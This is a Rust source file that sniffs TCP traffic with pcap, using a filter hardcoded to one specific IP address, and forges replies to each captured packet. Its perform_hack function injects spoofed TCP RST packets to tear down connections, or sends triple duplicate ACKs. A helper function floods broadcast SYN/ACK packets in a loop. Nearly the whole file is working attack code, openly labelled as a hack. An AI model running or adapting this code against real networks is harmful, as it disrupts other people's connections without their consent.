mod os;

use crate::os::OsInfo;
use etherparse::{EtherType, Ethernet2Header, IpNumber, Ipv4Header, PacketBuilder, TcpHeader};
use pcap::{Active, Capture, Device};
use std::hash::BuildHasher;
use std::thread::sleep;
use std::thread::{self, Builder};
use std::time::Duration;

enum AttackType {
    RSTInjection,
    DuplicateAck,
}

fn main() {
    let OsInfo {
        interface,
        device_mac,
        device_ip,
    } = OsInfo::fetch().expect("os fetch error");

    let attack_type = &AttackType::RSTInjection;

    let mut cap = get_capture(interface.as_str());
    let mut send_cap = get_capture(interface.as_str());

    // similar syntax to wireshark (BPF)
    // some examples:
    //
    // no filter: empty string
    // experimental protocol: ip protochain 253
    // TCP protocol: tcp
    let filter = "tcp and host 80.249.99.148";
    cap.filter(filter, true).expect("filter error");

    println!("listening on interface {} for packets...", interface);

    // start sending packets in a separate thread

    /*
    thread::spawn(move || {
        test_sending_packets(interface.as_str());
    });
    */

    // listen to incoming packets
    loop {
        match cap.next_packet() {
            Ok(packet) => {
                println!("captured a packet");

                let parse_res = parse_packet_to_tcp(packet.data);

                match parse_res {
                    Ok((ethernet_header, ipv4_header, tcp_header, payload)) => {
                        perform_hack(
                            ethernet_header,
                            ipv4_header,
                            tcp_header,
                            payload,
                            attack_type,
                            &mut send_cap,
                        );
                    }
                    Err(_) => {
                        // Suppress error prints to avoid flooding in console
                    }
                }
            }
            Err(pcap::Error::TimeoutExpired) => {
                println!("timeout");
            }
            Err(e) => {
                println!("error reading packet: {:?}", e);
            }
        }

        println!();
    }
}

/// Parses the raw packet to a TCP packet object
/// Returns an error if the frame is not Ethernet(IPv4(TCP))
fn parse_packet_to_tcp(
    packet_data: &[u8],
) -> Result<(Ethernet2Header, Ipv4Header, TcpHeader, &[u8]), String> {
    match Ethernet2Header::from_slice(packet_data) {
        Ok((ethernet_header, ethernet_bytes)) => {
            let ether_type = ethernet_header.ether_type;
            if ether_type == EtherType::IPV4 {
                match Ipv4Header::from_slice(ethernet_bytes) {
                    Ok((ipv4_header, ipv4_bytes)) => {
                        println!("ipv4 packet captured");

                        let protocol = ipv4_header.protocol;
                        match protocol {
                            IpNumber::TCP => match TcpHeader::from_slice(ipv4_bytes) {
                                Ok((tcp_header, tcp_bytes)) => {
                                    println!("tcp packet captured: {:?}", tcp_bytes);

                                    Ok((ethernet_header, ipv4_header, tcp_header, tcp_bytes))
                                }
                                Err(e) => Err(e.to_string()),
                            },
                            _ => Err(format!("protocol was not TCP, but {:?}", protocol)),
                        }
                    }
                    Err(e) => Err(e.to_string()),
                }
            } else if ether_type == EtherType::IPV6 {
                Err("ipv6 handling not implemented".to_string())
            } else {
                Err("unsupported ethertype protocol (not IP)".to_string())
            }
        }
        Err(e) => Err(e.to_string()),
    }
}

fn perform_hack(
    ethernet_header: Ethernet2Header,
    ipv4_header: Ipv4Header,
    tcp_header: TcpHeader,
    payload: &[u8],
    attack_type: &AttackType,
    send_cap: &mut Capture<Active>,
) {
    //let interface = OsInfo::get_interface();
    //let mut cap = get_capture(interface.as_str());

    //payload doesn't matter for the hacks, since we are just resetting the connection
    let payload = &[];

    // Builder
    let builder = PacketBuilder::ethernet2(ethernet_header.destination, ethernet_header.source)
        .ipv4(
            ipv4_header.destination,
            ipv4_header.source,
            ipv4_header.time_to_live,
        )
        .tcp(
            tcp_header.destination_port,
            tcp_header.source_port,
            tcp_header.acknowledgment_number, // used to be "tcp_header.sequence_number"
            tcp_header.window_size,
        );

    match attack_type {
        //RST injection to reset the connection
        AttackType::RSTInjection => {
            let builder = builder.rst();

            let mut packet = Vec::<u8>::with_capacity(builder.size(payload.len()));

            builder.write(&mut packet, payload).unwrap();

            send_cap.sendpacket(packet.as_slice()).unwrap(); // used to just be cap

            println!("RST injection sent");
        }
        AttackType::DuplicateAck => {
            let ack_number = tcp_header.sequence_number;

            let builder = builder.ack(ack_number);

            let mut packet = Vec::<u8>::with_capacity(builder.size(payload.len()));

            builder.write(&mut packet, payload).unwrap();

            send_cap.sendpacket(packet.as_slice()).unwrap();
            send_cap.sendpacket(packet.as_slice()).unwrap();
            send_cap.sendpacket(packet.as_slice()).unwrap();

            println!("3 times ACK sent");
        }
    }
}

/// Repeat sending some packets, used for testing
fn test_sending_packets(interface: &str) {
    sleep(Duration::from_secs(2));

    let mut cap = get_capture(interface);

    let payload = &[0x01, 0x02, 0x03, 0x04];

    // these dont matter too much it seems
    // ff:ff:ff:ff:ff:ff and 255.255.255.255 mean flood
    let source_mac = [0xffu8, 0xffu8, 0xffu8, 0xffu8, 0xffu8, 0xffu8];
    let destination_mac = [0xffu8, 0xffu8, 0xffu8, 0xffu8, 0xffu8, 0xffu8];

    let source_ip = [192, 168, 1, 1];
    let destination_ip = [255, 255, 255, 255];

    let source_port = 0;
    let destination_port = 42;
    let packet_builder = PacketBuilder::ethernet2(source_mac, destination_mac)
        .ipv4(source_ip, destination_ip, 20)
        .tcp(source_port, destination_port, 0, 42)
        .ack(13)
        .syn();

    let mut packet = Vec::<u8>::with_capacity(packet_builder.size(payload.len()));

    packet_builder.write(&mut packet, payload).unwrap();

    loop {
        cap.sendpacket(packet.as_slice()).unwrap();

        println!("packet sent");

        sleep(Duration::from_secs(1));
    }
}

/// Create a capture, that can be used to send or intercept packets
fn get_capture(interface: &str) -> Capture<Active> {
    let main_device = Device::list()
        .expect("error listing devices")
        .into_iter()
        .find(|d| d.name == interface)
        .expect(format!("could not find interface {}", interface).as_str());

    main_device.open().expect("error opening capture")
}
